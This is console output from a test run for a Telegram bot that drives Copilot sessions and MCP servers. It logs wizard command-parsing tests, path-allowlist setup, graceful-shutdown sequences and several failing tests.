2026-02-12T17:11:41.571Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"full-cmd-test","serverType":"stdio"}

[90mstdout[2m | tests/wizard-full-command-parsing.test.ts[2m > [22m[2mServerWizard - Full Command Parsing (Issue #2)[2m > [22m[2mCommand with arguments in command step[2m > [22m[2mshould handle quoted arguments in command[22m[39m
2026-02-12T17:11:41.578Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:41.731Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"quoted-cmd","serverType":"stdio"}

[90mstdout[2m | tests/wizard-full-command-parsing.test.ts[2m > [22m[2mServerWizard - Full Command Parsing (Issue #2)[2m > [22m[2mCommand with arguments in command step[2m > [22m[2mshould handle Windows paths in command[22m[39m
2026-02-12T17:11:41.733Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:41.926Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"windows-cmd","serverType":"stdio"}

[90mstdout[2m | tests/wizard-full-command-parsing.test.ts[2m > [22m[2mServerWizard - Full Command Parsing (Issue #2)[2m > [22m[2mCommand with arguments in command step[2m > [22m[2mshould handle command with just executable (backward compatibility)[22m[39m
2026-02-12T17:11:41.928Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:42.090Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"simple-cmd","serverType":"stdio"}

[90mstdout[2m | tests/wizard-full-command-parsing.test.ts[2m > [22m[2mServerWizard - Full Command Parsing (Issue #2)[2m > [22m[2mCombining command args with user args[2m > [22m[2mshould combine initial args from command with user-provided args[22m[39m
2026-02-12T17:11:42.092Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:42.247Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"combined-args","serverType":"stdio"}

[90mstdout[2m | tests/wizard-full-command-parsing.test.ts[2m > [22m[2mServerWizard - Full Command Parsing (Issue #2)[2m > [22m[2mCombining command args with user args[2m > [22m[2mshould preserve initial args if user provides empty args[22m[39m
2026-02-12T17:11:42.250Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:42.409Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"preserve-initial","serverType":"stdio"}

[90mstdout[2m | tests/wizard-full-command-parsing.test.ts[2m > [22m[2mServerWizard - Full Command Parsing (Issue #2)[2m > [22m[2mCombining command args with user args[2m > [22m[2mshould allow user to override/extend with complex args[22m[39m
2026-02-12T17:11:42.411Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:42.585Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"complex-override","serverType":"stdio"}

[90mstdout[2m | tests/wizard-full-command-parsing.test.ts[2m > [22m[2mServerWizard - Full Command Parsing (Issue #2)[2m > [22m[2mCombining command args with user args[2m > [22m[2mshould handle when command has no initial args and user adds args[22m[39m
2026-02-12T17:11:42.589Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:42.805Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"no-initial-args","serverType":"stdio"}

[90mstdout[2m | tests/wizard-full-command-parsing.test.ts[2m > [22m[2mServerWizard - Full Command Parsing (Issue #2)[2m > [22m[2mReal-world scenarios[2m > [22m[2mshould handle typical npx server invocation[22m[39m
2026-02-12T17:11:42.808Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:42.989Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"npx-filesystem","serverType":"stdio"}

[90mstdout[2m | tests/wizard-full-command-parsing.test.ts[2m > [22m[2mServerWizard - Full Command Parsing (Issue #2)[2m > [22m[2mReal-world scenarios[2m > [22m[2mshould handle node with require flag[22m[39m
2026-02-12T17:11:42.992Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:43.186Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"node-require","serverType":"stdio"}

[90mstdout[2m | tests/wizard-full-command-parsing.test.ts[2m > [22m[2mServerWizard - Full Command Parsing (Issue #2)[2m > [22m[2mReal-world scenarios[2m > [22m[2mshould handle Python with module flag[22m[39m
2026-02-12T17:11:43.188Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:43.405Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"python-module","serverType":"stdio"}

[90mstdout[2m | tests/wizard-full-command-parsing.test.ts[2m > [22m[2mServerWizard - Full Command Parsing (Issue #2)[2m > [22m[2mReal-world scenarios[2m > [22m[2mshould handle command with quoted executable path[22m[39m
2026-02-12T17:11:43.407Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:43.644Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"quoted-exe","serverType":"stdio"}

[90mstdout[2m | tests/wizard-full-command-parsing.test.ts[2m > [22m[2mServerWizard - Full Command Parsing (Issue #2)[2m > [22m[2mEdge cases and validation[2m > [22m[2mshould reject empty command string[22m[39m
2026-02-12T17:11:43.646Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/wizard-full-command-parsing.test.ts[2m > [22m[2mServerWizard - Full Command Parsing (Issue #2)[2m > [22m[2mEdge cases and validation[2m > [22m[2mshould handle command with only spaces between tokens[22m[39m
2026-02-12T17:11:43.649Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:43.832Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"spaces-test","serverType":"stdio"}

 [32mÃ”Â£Ã´[39m tests/wizard-full-command-parsing.test.ts [2m ([22m[2m14 tests[22m[2m)[22m[33m 2436[2mms[22m[39m
[90mstdout[2m | tests/async-io.test.ts[2m > [22m[2mAsync I/O Operations[2m > [22m[2mpath-setup async operations[2m > [22m[2mshould update .env file asynchronously[22m[39m
2026-02-12T17:11:43.889Z [[32minfo[39m]: Updated .env file with ALLOWED_PATHS {"paths":["/test/path1","/test/path2"]}

[90mstdout[2m | tests/async-io.test.ts[2m > [22m[2mAsync I/O Operations[2m > [22m[2mpath-setup async operations[2m > [22m[2mshould not block event loop during env file update[22m[39m
2026-02-12T17:11:43.932Z [[32minfo[39m]: Updated .env file with ALLOWED_PATHS {"paths":["/test/path1","/test/path2"]}

 [31mÃ”Ã˜Â»[39m tests/async-io.test.ts [2m ([22m[2m10 tests[22m [2m|[22m [31m3 failed[39m[2m)[22m[33m 736[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m Async I/O Operations[2m > [22mMcpRegistry async file operations[2m > [22mshould not block event loop during large file reads[39m
[31m     Ã”Ã¥Ã† expected true to be false // Object.is equality[39m
[31m   [31mâ”œÃ¹[31m Async I/O Operations[2m > [22mpath-setup async operations[2m > [22mshould not block event loop during env file update[39m
[31m     Ã”Ã¥Ã† expected true to be false // Object.is equality[39m
[31m   [31mâ”œÃ¹[31m Async I/O Operations[2m > [22mdatabase async initialization[2m > [22mshould create database directory asynchronously[39m
[31m     Ã”Ã¥Ã† db.close is not a function[39m
stderr | tests/config-allowlist-update.test.ts > Config Allowlist Update (Issue #7 Codex) > backward compatibility > should maintain needsAllowlistSetup flag behavior
Ã”ÃœÃ¡Â´Â©Ã…  SEGURIDAD: ALLOWED_PATHS vacâ”œÂ¡o. El bot solicitarâ”œÃ­ configuraciâ”œâ”‚n en primer inicio.

 [32mÃ”Â£Ã´[39m tests/config-allowlist-update.test.ts [2m ([22m[2m10 tests[22m[2m)[22m[33m 366[2mms[22m[39m
[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mGraceful Shutdown Flow[2m > [22m[2mshould call gracefulShutdown instead of process.exit(0) directly[22m[39m
2026-02-12T17:11:44.158Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456789}
2026-02-12T17:11:44.158Z [[32minfo[39m]: Processing allowlist input {"telegramId":123456789,"input":"C:\\Users\\Test\\Projects"}
2026-02-12T17:11:44.158Z [[32minfo[39m]: Allowlist configured successfully {"paths":["C:\\Users\\Test\\Projects"],"telegramId":123456789}

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mGraceful Shutdown Flow[2m > [22m[2mshould call gracefulShutdown instead of process.exit(0) directly[22m[39m
2026-02-12T17:11:46.158Z [[32minfo[39m]: Triggering graceful shutdown to apply new allowlist configuration
2026-02-12T17:11:46.158Z [[32minfo[39m]: Starting graceful shutdown... {"exitCode":0}
2026-02-12T17:11:46.158Z [[32minfo[39m]: Closing database connection...
2026-02-12T17:11:46.158Z [[32minfo[39m]: Database connection closed successfully
2026-02-12T17:11:46.158Z [[32minfo[39m]: Flushing logs...

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mGraceful Shutdown Flow[2m > [22m[2mshould call gracefulShutdown instead of process.exit(0) directly[22m[39m
2026-02-12T17:11:46.258Z [[32minfo[39m]: Graceful shutdown complete

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mGraceful Shutdown Flow[2m > [22m[2mshould stop bot before closing database[22m[39m
2026-02-12T17:11:44.198Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456789}
2026-02-12T17:11:44.198Z [[32minfo[39m]: Processing allowlist input {"telegramId":123456789,"input":"C:\\Users\\Test\\Projects"}
2026-02-12T17:11:44.198Z [[32minfo[39m]: Allowlist configured successfully {"paths":["C:\\Users\\Test\\Projects"],"telegramId":123456789}

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mGraceful Shutdown Flow[2m > [22m[2mshould stop bot before closing database[22m[39m
2026-02-12T17:11:46.198Z [[32minfo[39m]: Triggering graceful shutdown to apply new allowlist configuration
2026-02-12T17:11:46.198Z [[32minfo[39m]: Starting graceful shutdown... {"exitCode":0}
2026-02-12T17:11:46.198Z [[32minfo[39m]: Stopping Telegram bot...
2026-02-12T17:11:46.198Z [[32minfo[39m]: Telegram bot stopped successfully
2026-02-12T17:11:46.198Z [[32minfo[39m]: Closing active Copilot sessions...
2026-02-12T17:11:46.198Z [[32minfo[39m]: Copilot sessions closed successfully
2026-02-12T17:11:46.198Z [[32minfo[39m]: Closing database connection...
2026-02-12T17:11:46.198Z [[32minfo[39m]: Database connection closed successfully
2026-02-12T17:11:46.198Z [[32minfo[39m]: Flushing logs...
2026-02-12T17:11:46.298Z [[32minfo[39m]: Graceful shutdown complete

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mGraceful Shutdown Flow[2m > [22m[2mshould close all Copilot sessions during shutdown[22m[39m
2026-02-12T17:11:44.208Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456789}
2026-02-12T17:11:44.208Z [[32minfo[39m]: Processing allowlist input {"telegramId":123456789,"input":"C:\\Users\\Test\\Projects"}
2026-02-12T17:11:44.208Z [[32minfo[39m]: Allowlist configured successfully {"paths":["C:\\Users\\Test\\Projects"],"telegramId":123456789}

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mGraceful Shutdown Flow[2m > [22m[2mshould close all Copilot sessions during shutdown[22m[39m
2026-02-12T17:11:46.208Z [[32minfo[39m]: Triggering graceful shutdown to apply new allowlist configuration
2026-02-12T17:11:46.208Z [[32minfo[39m]: Starting graceful shutdown... {"exitCode":0}
2026-02-12T17:11:46.208Z [[32minfo[39m]: Stopping Telegram bot...
2026-02-12T17:11:46.208Z [[32minfo[39m]: Telegram bot stopped successfully
2026-02-12T17:11:46.208Z [[32minfo[39m]: Closing active Copilot sessions...
2026-02-12T17:11:46.208Z [[32minfo[39m]: Copilot sessions closed successfully
2026-02-12T17:11:46.208Z [[32minfo[39m]: Closing database connection...
2026-02-12T17:11:46.208Z [[32minfo[39m]: Database connection closed successfully
2026-02-12T17:11:46.208Z [[32minfo[39m]: Flushing logs...

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mGraceful Shutdown Flow[2m > [22m[2mshould close all Copilot sessions during shutdown[22m[39m
2026-02-12T17:11:46.308Z [[32minfo[39m]: Graceful shutdown complete

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mGraceful Shutdown Flow[2m > [22m[2mshould flush logs before exit[22m[39m
2026-02-12T17:11:44.218Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456789}
2026-02-12T17:11:44.218Z [[32minfo[39m]: Processing allowlist input {"telegramId":123456789,"input":"C:\\Users\\Test\\Projects"}
2026-02-12T17:11:44.218Z [[32minfo[39m]: Allowlist configured successfully {"paths":["C:\\Users\\Test\\Projects"],"telegramId":123456789}

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mGraceful Shutdown Flow[2m > [22m[2mshould flush logs before exit[22m[39m
2026-02-12T17:11:46.218Z [[32minfo[39m]: Triggering graceful shutdown to apply new allowlist configuration
2026-02-12T17:11:46.218Z [[32minfo[39m]: Starting graceful shutdown... {"exitCode":0}
2026-02-12T17:11:46.218Z [[32minfo[39m]: Stopping Telegram bot...
2026-02-12T17:11:46.218Z [[32minfo[39m]: Telegram bot stopped successfully
2026-02-12T17:11:46.218Z [[32minfo[39m]: Closing active Copilot sessions...
2026-02-12T17:11:46.218Z [[32minfo[39m]: Copilot sessions closed successfully
2026-02-12T17:11:46.218Z [[32minfo[39m]: Closing database connection...
2026-02-12T17:11:46.218Z [[32minfo[39m]: Database connection closed successfully
2026-02-12T17:11:46.218Z [[32minfo[39m]: Flushing logs...
2026-02-12T17:11:46.318Z [[32minfo[39m]: Graceful shutdown complete

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mShutdown Timeout (10s Safety)[2m > [22m[2mshould force exit if graceful shutdown takes longer than 10 seconds[22m[39m
2026-02-12T17:11:44.226Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456789}
2026-02-12T17:11:44.226Z [[32minfo[39m]: Processing allowlist input {"telegramId":123456789,"input":"C:\\Users\\Test\\Projects"}
2026-02-12T17:11:44.226Z [[32minfo[39m]: Allowlist configured successfully {"paths":["C:\\Users\\Test\\Projects"],"telegramId":123456789}

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mShutdown Timeout (10s Safety)[2m > [22m[2mshould force exit if graceful shutdown takes longer than 10 seconds[22m[39m
2026-02-12T17:11:46.226Z [[32minfo[39m]: Triggering graceful shutdown to apply new allowlist configuration
2026-02-12T17:11:46.226Z [[32minfo[39m]: Starting graceful shutdown... {"exitCode":0}
2026-02-12T17:11:46.226Z [[32minfo[39m]: Stopping Telegram bot...
2026-02-12T17:11:46.226Z [[32minfo[39m]: Telegram bot stopped successfully
2026-02-12T17:11:46.226Z [[32minfo[39m]: Closing active Copilot sessions...
2026-02-12T17:11:46.226Z [[32minfo[39m]: Copilot sessions closed successfully
2026-02-12T17:11:46.226Z [[32minfo[39m]: Closing database connection...
2026-02-12T17:11:46.226Z [[32minfo[39m]: Database connection closed successfully
2026-02-12T17:11:46.226Z [[32minfo[39m]: Flushing logs...

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mShutdown Timeout (10s Safety)[2m > [22m[2mshould force exit if graceful shutdown takes longer than 10 seconds[22m[39m
2026-02-12T17:11:46.326Z [[32minfo[39m]: Graceful shutdown complete

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mShutdown Timeout (10s Safety)[2m > [22m[2mshould exit with code 1 when shutdown timeout is exceeded[22m[39m
2026-02-12T17:11:44.236Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456789}
2026-02-12T17:11:44.236Z [[32minfo[39m]: Processing allowlist input {"telegramId":123456789,"input":"C:\\Users\\Test\\Projects"}
2026-02-12T17:11:44.236Z [[32minfo[39m]: Allowlist configured successfully {"paths":["C:\\Users\\Test\\Projects"],"telegramId":123456789}
2026-02-12T17:11:46.236Z [[32minfo[39m]: Triggering graceful shutdown to apply new allowlist configuration
2026-02-12T17:11:46.236Z [[32minfo[39m]: Starting graceful shutdown... {"exitCode":0}
2026-02-12T17:11:46.236Z [[32minfo[39m]: Stopping Telegram bot...
2026-02-12T17:11:46.236Z [[32minfo[39m]: Telegram bot stopped successfully
2026-02-12T17:11:46.236Z [[32minfo[39m]: Closing active Copilot sessions...
2026-02-12T17:11:46.236Z [[32minfo[39m]: Copilot sessions closed successfully
2026-02-12T17:11:46.236Z [[32minfo[39m]: Closing database connection...
2026-02-12T17:11:46.236Z [[32minfo[39m]: Database connection closed successfully
2026-02-12T17:11:46.236Z [[32minfo[39m]: Flushing logs...

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mDatabase Integrity After Shutdown[2m > [22m[2mshould ensure database is properly closed before exit[22m[39m
2026-02-12T17:11:44.252Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456789}
2026-02-12T17:11:44.252Z [[32minfo[39m]: Processing allowlist input {"telegramId":123456789,"input":"C:\\Users\\Test\\Projects"}
2026-02-12T17:11:44.252Z [[32minfo[39m]: Allowlist configured successfully {"paths":["C:\\Users\\Test\\Projects"],"telegramId":123456789}

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mDatabase Integrity After Shutdown[2m > [22m[2mshould ensure database is properly closed before exit[22m[39m
2026-02-12T17:11:46.252Z [[32minfo[39m]: Triggering graceful shutdown to apply new allowlist configuration
2026-02-12T17:11:46.252Z [[32minfo[39m]: Starting graceful shutdown... {"exitCode":0}
2026-02-12T17:11:46.252Z [[32minfo[39m]: Stopping Telegram bot...
2026-02-12T17:11:46.252Z [[32minfo[39m]: Telegram bot stopped successfully
2026-02-12T17:11:46.252Z [[32minfo[39m]: Closing active Copilot sessions...
2026-02-12T17:11:46.252Z [[32minfo[39m]: Copilot sessions closed successfully
2026-02-12T17:11:46.252Z [[32minfo[39m]: Closing database connection...
2026-02-12T17:11:46.252Z [[32minfo[39m]: Database connection closed successfully
2026-02-12T17:11:46.252Z [[32minfo[39m]: Flushing logs...
2026-02-12T17:11:46.352Z [[32minfo[39m]: Graceful shutdown complete

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mDatabase Integrity After Shutdown[2m > [22m[2mshould not leave database in inconsistent state after shutdown[22m[39m
2026-02-12T17:11:44.261Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456789}
2026-02-12T17:11:44.261Z [[32minfo[39m]: Processing allowlist input {"telegramId":123456789,"input":"C:\\Users\\Test\\Projects"}
2026-02-12T17:11:44.261Z [[32minfo[39m]: Allowlist configured successfully {"paths":["C:\\Users\\Test\\Projects"],"telegramId":123456789}

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mDatabase Integrity After Shutdown[2m > [22m[2mshould not leave database in inconsistent state after shutdown[22m[39m
2026-02-12T17:11:46.261Z [[32minfo[39m]: Triggering graceful shutdown to apply new allowlist configuration
2026-02-12T17:11:46.261Z [[32minfo[39m]: Starting graceful shutdown... {"exitCode":0}
2026-02-12T17:11:46.261Z [[32minfo[39m]: Stopping Telegram bot...
2026-02-12T17:11:46.261Z [[32minfo[39m]: Telegram bot stopped successfully
2026-02-12T17:11:46.261Z [[32minfo[39m]: Closing active Copilot sessions...
2026-02-12T17:11:46.261Z [[32minfo[39m]: Copilot sessions closed successfully
2026-02-12T17:11:46.261Z [[32minfo[39m]: Closing database connection...
2026-02-12T17:11:46.261Z [[32minfo[39m]: Database connection closed successfully
2026-02-12T17:11:46.261Z [[32minfo[39m]: Flushing logs...

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mDatabase Integrity After Shutdown[2m > [22m[2mshould not leave database in inconsistent state after shutdown[22m[39m
2026-02-12T17:11:46.361Z [[32minfo[39m]: Graceful shutdown complete

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mError Handling During Shutdown[2m > [22m[2mshould still call process.exit even if shutdown step fails[22m[39m
2026-02-12T17:11:44.272Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456789}
2026-02-12T17:11:44.272Z [[32minfo[39m]: Processing allowlist input {"telegramId":123456789,"input":"C:\\Users\\Test\\Projects"}
2026-02-12T17:11:44.272Z [[32minfo[39m]: Allowlist configured successfully {"paths":["C:\\Users\\Test\\Projects"],"telegramId":123456789}
2026-02-12T17:11:46.272Z [[32minfo[39m]: Triggering graceful shutdown to apply new allowlist configuration
2026-02-12T17:11:46.272Z [[32minfo[39m]: Starting graceful shutdown... {"exitCode":0}
2026-02-12T17:11:46.272Z [[32minfo[39m]: Stopping Telegram bot...
2026-02-12T17:11:46.272Z [[32minfo[39m]: Telegram bot stopped successfully
2026-02-12T17:11:46.272Z [[32minfo[39m]: Closing active Copilot sessions...
2026-02-12T17:11:46.272Z [[32minfo[39m]: Copilot sessions closed successfully
2026-02-12T17:11:46.272Z [[32minfo[39m]: Closing database connection...
2026-02-12T17:11:46.272Z [[32minfo[39m]: Database connection closed successfully
2026-02-12T17:11:46.272Z [[32minfo[39m]: Flushing logs...

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mError Handling During Shutdown[2m > [22m[2mshould still call process.exit even if shutdown step fails[22m[39m
2026-02-12T17:11:46.372Z [[32minfo[39m]: Graceful shutdown complete

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mError Handling During Shutdown[2m > [22m[2mshould log errors during graceful shutdown[22m[39m
2026-02-12T17:11:44.282Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456789}
2026-02-12T17:11:44.282Z [[32minfo[39m]: Processing allowlist input {"telegramId":123456789,"input":"C:\\Users\\Test\\Projects"}
2026-02-12T17:11:44.282Z [[32minfo[39m]: Allowlist configured successfully {"paths":["C:\\Users\\Test\\Projects"],"telegramId":123456789}

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mError Handling During Shutdown[2m > [22m[2mshould log errors during graceful shutdown[22m[39m
2026-02-12T17:11:46.282Z [[32minfo[39m]: Triggering graceful shutdown to apply new allowlist configuration
2026-02-12T17:11:46.282Z [[32minfo[39m]: Starting graceful shutdown... {"exitCode":0}
2026-02-12T17:11:46.282Z [[32minfo[39m]: Stopping Telegram bot...
2026-02-12T17:11:46.282Z [[32minfo[39m]: Telegram bot stopped successfully
2026-02-12T17:11:46.282Z [[32minfo[39m]: Closing active Copilot sessions...
2026-02-12T17:11:46.282Z [[32minfo[39m]: Copilot sessions closed successfully
2026-02-12T17:11:46.282Z [[32minfo[39m]: Closing database connection...
2026-02-12T17:11:46.282Z [[32minfo[39m]: Database connection closed successfully
2026-02-12T17:11:46.282Z [[32minfo[39m]: Flushing logs...

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mError Handling During Shutdown[2m > [22m[2mshould log errors during graceful shutdown[22m[39m
2026-02-12T17:11:46.382Z [[32minfo[39m]: Graceful shutdown complete

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mError Handling During Shutdown[2m > [22m[2mshould continue shutdown even if sessionManager.closeAllSessions fails[22m[39m
2026-02-12T17:11:44.294Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456789}
2026-02-12T17:11:44.294Z [[32minfo[39m]: Processing allowlist input {"telegramId":123456789,"input":"C:\\Users\\Test\\Projects"}
2026-02-12T17:11:44.294Z [[32minfo[39m]: Allowlist configured successfully {"paths":["C:\\Users\\Test\\Projects"],"telegramId":123456789}
2026-02-12T17:11:46.294Z [[32minfo[39m]: Triggering graceful shutdown to apply new allowlist configuration
2026-02-12T17:11:46.294Z [[32minfo[39m]: Starting graceful shutdown... {"exitCode":0}
2026-02-12T17:11:46.294Z [[32minfo[39m]: Stopping Telegram bot...
2026-02-12T17:11:46.294Z [[32minfo[39m]: Telegram bot stopped successfully
2026-02-12T17:11:46.294Z [[32minfo[39m]: Closing active Copilot sessions...
2026-02-12T17:11:46.294Z [[32minfo[39m]: Copilot sessions closed successfully
2026-02-12T17:11:46.294Z [[32minfo[39m]: Closing database connection...
2026-02-12T17:11:46.294Z [[32minfo[39m]: Database connection closed successfully
2026-02-12T17:11:46.294Z [[32minfo[39m]: Flushing logs...

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mError Handling During Shutdown[2m > [22m[2mshould continue shutdown even if sessionManager.closeAllSessions fails[22m[39m
2026-02-12T17:11:46.394Z [[32minfo[39m]: Graceful shutdown complete

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mCleanup of Wizard State Before Shutdown[2m > [22m[2mshould cleanup wizard session before triggering shutdown[22m[39m
2026-02-12T17:11:44.300Z [[32minfo[39m]: Starting allowlist setup wizard {"telegramId":123456789}
2026-02-12T17:11:44.300Z [[32minfo[39m]: Processing allowlist input {"telegramId":123456789,"input":"C:\\Users\\Test\\Projects"}
2026-02-12T17:11:44.300Z [[32minfo[39m]: Allowlist configured successfully {"paths":["C:\\Users\\Test\\Projects"],"telegramId":123456789}

[90mstdout[2m | tests/allowlist-graceful-shutdown.test.ts[2m > [22m[2mAllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22m[2mCleanup of Wizard State Before Shutdown[2m > [22m[2mshould cleanup wizard session before triggering shutdown[22m[39m
2026-02-12T17:11:46.300Z [[32minfo[39m]: Triggering graceful shutdown to apply new allowlist configuration
2026-02-12T17:11:46.300Z [[32minfo[39m]: Starting graceful shutdown... {"exitCode":0}
2026-02-12T17:11:46.300Z [[32minfo[39m]: Stopping Telegram bot...
2026-02-12T17:11:46.300Z [[32minfo[39m]: Telegram bot stopped successfully
2026-02-12T17:11:46.300Z [[32minfo[39m]: Closing active Copilot sessions...
2026-02-12T17:11:46.300Z [[32minfo[39m]: Copilot sessions closed successfully
2026-02-12T17:11:46.300Z [[32minfo[39m]: Closing database connection...
2026-02-12T17:11:46.300Z [[32minfo[39m]: Database connection closed successfully
2026-02-12T17:11:46.300Z [[32minfo[39m]: Flushing logs...
2026-02-12T17:11:46.400Z [[32minfo[39m]: Graceful shutdown complete

 [31mÃ”Ã˜Â»[39m tests/allowlist-graceful-shutdown.test.ts [2m ([22m[2m12 tests[22m [2m|[22m [31m1 failed[39m[2m)[22m[90m 154[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m AllowlistSetupWizard - Graceful Shutdown (Issue #5)[2m > [22mShutdown Timeout (10s Safety)[2m > [22mshould exit with code 1 when shutdown timeout is exceeded[39m
[31m     Ã”Ã¥Ã† expected "spy" to be called at least once[39m
 [31mÃ”Ã˜Â»[39m tests/commands-reset.test.ts [2m ([22m[2m4 tests[22m [2m|[22m [31m4 failed[39m[2m)[22m[90m 30[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m /reset command[2m > [22mshould reset active session and clear busy state[39m
[31m     Ã”Ã¥Ã† Failed to load url ../src/bot/commands (resolved id: ../src/bot/commands) in D:/Juanma/MCP Copilot Telegram/tests/commands-reset.test.ts. Does the file exist?[39m
[31m   [31mâ”œÃ¹[31m /reset command[2m > [22mshould respond when no active session exists[39m
[31m     Ã”Ã¥Ã† Failed to load url ../src/bot/commands (resolved id: ../src/bot/commands) in D:/Juanma/MCP Copilot Telegram/tests/commands-reset.test.ts. Does the file exist?[39m
[31m   [31mâ”œÃ¹[31m /reset command[2m > [22mshould clear busy state even on error[39m
[31m     Ã”Ã¥Ã† Failed to load url ../src/bot/commands (resolved id: ../src/bot/commands) in D:/Juanma/MCP Copilot Telegram/tests/commands-reset.test.ts. Does the file exist?[39m
[31m   [31mâ”œÃ¹[31m /reset command[2m > [22mshould log reset action with user ID and project path[39m
